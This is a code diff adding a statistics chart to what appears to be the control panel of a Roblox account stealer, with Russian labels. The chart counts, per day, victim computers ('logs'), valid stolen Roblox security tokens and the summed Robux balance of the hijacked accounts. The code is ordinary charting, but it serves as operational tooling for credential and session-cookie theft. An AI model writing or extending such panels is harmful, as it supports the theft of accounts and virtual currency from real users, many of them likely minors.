@@ -41,10 +41,131 @@ async function loadFiles() {
     }
 
     updateStats();
+    renderChart(allFiles);
     filterFiles();
   } catch (e) {
     if (e.message !== 'auth') toast("Ошибка загрузки файлов", "err");
   }
+}
+
+function renderChart(files) {
+  const ctx = document.getElementById('statsChart');
+  if (!ctx || typeof Chart === 'undefined') return;
+  
+  const last7Days = [];
+  for (let i = 6; i >= 0; i--) {
+    const d = new Date();
+    d.setDate(d.getDate() - i);
+    const offset = d.getTimezoneOffset() * 60000;
+    last7Days.push((new Date(d - offset)).toISOString().split('T')[0]);
+  }
+  
+  const dataMap = {};
+  last7Days.forEach(date => {
+    dataMap[date] = { computers: new Set(), cookies: 0, robux: 0 };
+  });
+  
+  files.forEach(f => {
+    if (!f.uploadedAt) return;
+    const dateObj = new Date(f.uploadedAt);
+    if (isNaN(dateObj)) return;
+    
+    const offset = dateObj.getTimezoneOffset() * 60000;
+    const localISOTime = (new Date(dateObj - offset)).toISOString().split('T')[0];
+    
+    if (dataMap[localISOTime]) {
+      if (f.computer && f.computer.name) {
+        dataMap[localISOTime].computers.add(f.computer.name);
+      } else {
+        dataMap[localISOTime].computers.add(f.name);
+      }
+      
+      const hasValidToken = f.roblox && f.roblox.security && f.roblox.security.length > 0 && (!f.robuxInfo || f.robuxInfo.valid !== false);
+      if (hasValidToken) {
+        dataMap[localISOTime].cookies++;
+        if (f.robuxInfo && f.robuxInfo.robux) {
+          dataMap[localISOTime].robux += f.robuxInfo.robux;
+        }
+      }
+    }
+  });
+  
+  const labels = last7Days.map(d => {
+    const [y, m, day] = d.split('-');
+    return `${day}.${m}`;
+  });
+  
+  const computersData = last7Days.map(d => dataMap[d].computers.size);
+  const cookiesData = last7Days.map(d => dataMap[d].cookies);
+  const robuxData = last7Days.map(d => dataMap[d].robux);
+  
+  if (window.statsChartInstance) {
+    window.statsChartInstance.destroy();
+  }
+  
+  Chart.defaults.color = 'rgba(255, 255, 255, 0.6)';
+  Chart.defaults.font.family = "'Inter', sans-serif";
+  
+  window.statsChartInstance = new Chart(ctx, {
+    type: 'line',
+    data: {
+      labels: labels,
+      datasets: [
+        {
+          label: 'Робуксы',
+          data: robuxData,
+          borderColor: '#f59e0b',
+          backgroundColor: 'rgba(245, 158, 11, 0.1)',
+          borderWidth: 2,
+          tension: 0.4,
+          fill: true,
+          yAxisID: 'y1'
+        },
+        {
+          label: 'Токены',
+          data: cookiesData,
+          borderColor: '#10b981',
+          backgroundColor: 'rgba(16, 185, 129, 0.1)',
+          borderWidth: 2,
+          tension: 0.4,
+          fill: true,
+          yAxisID: 'y'
+        },
+        {
+          label: 'Логи',
+          data: computersData,
+          borderColor: '#6366f1',
+          backgroundColor: 'rgba(99, 102, 241, 0.1)',
+          borderWidth: 2,
+          tension: 0.4,
+          fill: true,
+          yAxisID: 'y'
+        }
+      ]
+    },
+    options: {
+      responsive: true,
+      maintainAspectRatio: false,
+      interaction: { mode: 'index', intersect: false },
+      plugins: {
+        legend: { position: 'top', labels: { usePointStyle: true, boxWidth: 8 } },
+        tooltip: { backgroundColor: 'rgba(15, 17, 26, 0.9)', titleColor: '#fff', bodyColor: '#ccc', borderColor: 'rgba(255,255,255,0.1)', borderWidth: 1, padding: 10, cornerRadius: 8 }
+      },
+      scales: {
+        x: { grid: { color: 'rgba(255, 255, 255, 0.05)' } },
+        y: { 
+          type: 'linear', display: true, position: 'left',
+          grid: { color: 'rgba(255, 255, 255, 0.05)' },
+          ticks: { precision: 0 }
+        },
+        y1: {
+          type: 'linear', display: true, position: 'right',
+          grid: { drawOnChartArea: false },
+          ticks: { precision: 0 }
+        }
+      }
+    }
+  });
 }
 
 function updateStats() {
